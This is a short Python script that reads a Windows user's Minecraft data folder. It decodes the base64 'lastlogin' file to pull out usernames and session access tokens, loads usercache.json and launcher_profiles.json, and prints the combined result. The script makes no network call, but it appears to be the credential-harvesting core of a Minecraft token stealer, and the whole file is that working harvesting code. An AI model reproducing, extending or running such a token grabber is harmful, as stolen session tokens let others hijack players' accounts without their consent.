#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import json
import os
import base64
from datetime import datetime

def get_minecraft_dir():
    return os.path.join(os.environ["APPDATA"], ".minecraft")

def extract_sessions():
    minecraft_dir = get_minecraft_dir()
    data = {"extracted_at": datetime.now().isoformat(), "accounts": []}
    lastlogin_path = os.path.join(minecraft_dir, "lastlogin")
    if os.path.exists(lastlogin_path):
        with open(lastlogin_path, "rb") as f:
            encoded = f.read().strip()
            if encoded:
                decoded = base64.b64decode(encoded).decode('utf-8')
                session = json.loads(decoded)
                data["accounts"].append({"source": "lastlogin", "username": session.get("username", ""), "access_token": session.get("accessToken", "")})
    usercache_path = os.path.join(minecraft_dir, "usercache.json")
    if os.path.exists(usercache_path):
        with open(usercache_path, "r", encoding="utf-8") as f:
            cache = json.load(f)
            for account in cache:
                data["accounts"].append({"source": "usercache", "username": account.get("name", ""), "uuid": account.get("id", ""), "properties": account.get("properties", [])})
    return data

def get_launcher_profiles():
    minecraft_dir = get_minecraft_dir()
    launcher_path = os.path.join(minecraft_dir, "launcher_profiles.json")
    if os.path.exists(launcher_path):
        with open(launcher_path, "r", encoding="utf-8") as f:
            return json.load(f)
    return {}

def main():
    print("extracting minecraft data...")
    sessions_data = extract_sessions()
    launcher_profiles = get_launcher_profiles()
    
    if not sessions_data["accounts"]:
        sessions_data = {"extracted_at": datetime.now().isoformat(), "accounts": []}
    if not launcher_profiles:
        launcher_profiles = {}
    
    combined_data = {
        "sessions": sessions_data,
        "launcher_profiles": launcher_profiles
    }
    
    if combined_data["sessions"]["accounts"]:
        print(f"found {len(combined_data['sessions']['accounts'])} accounts/sessions.")
    else:
        print("no sessions found.")
    
    if combined_data["launcher_profiles"]:
        print("launcher profiles data included.")
    else:
        print("no launcher_profiles.json found.")
    
    print("all data stored in 'combined_data' variable:")
    print(combined_data)

if __name__ == "__main__":
    main()